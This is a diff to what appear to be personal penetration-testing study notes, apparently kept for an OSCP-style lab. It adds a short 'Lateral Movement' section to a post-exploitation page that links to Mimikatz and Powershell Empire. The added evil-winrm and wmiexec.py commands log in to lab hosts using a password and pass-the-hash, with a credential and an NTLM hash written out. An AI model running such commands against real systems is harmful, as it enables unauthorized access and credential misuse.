@@ -13165,7 +13165,7 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ### Change (not add, It will pick the first proxy server) the last line to `socks4 127.0.0.1 1080`
 ## `proxychains4 &lt;command&gt;`</pre>
 </div>
-<div created="20211205085540773" modified="20211215155054871" title="Post Exploitation">
+<div created="20211205085540773" modified="20211215155216279" title="Post Exploitation">
 <pre>
 https://sushant747.gitbooks.io/total-oscp-guide/content/loot_windows_-_for_credentials_and_other_stuff.html
 
@@ -13177,7 +13177,15 @@ https://github.com/emilyanncr/Windows-Post-Exploitation
 
 [[Mimikatz]]
 
-[[Powershell Empire]]</pre>
+[[Powershell Empire]]
+
+Lateral Movement
+
+```
+evil-winrm -u sqlServer -p shantewhite -i 10.11.1.121 -P 5985
+evil-winrm -u sqlServer -H hash -i 10.11.1.121 -P 5985
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fc9bc6a6f510b2a92388f67962a33b1c Administrator@10.11.1.120  
+```</pre>
 </div>
 <div created="20211209134133448" modified="20211209140536253" title="Powershell Empire" type="text/x-markdown">
 <pre># 1. Setup
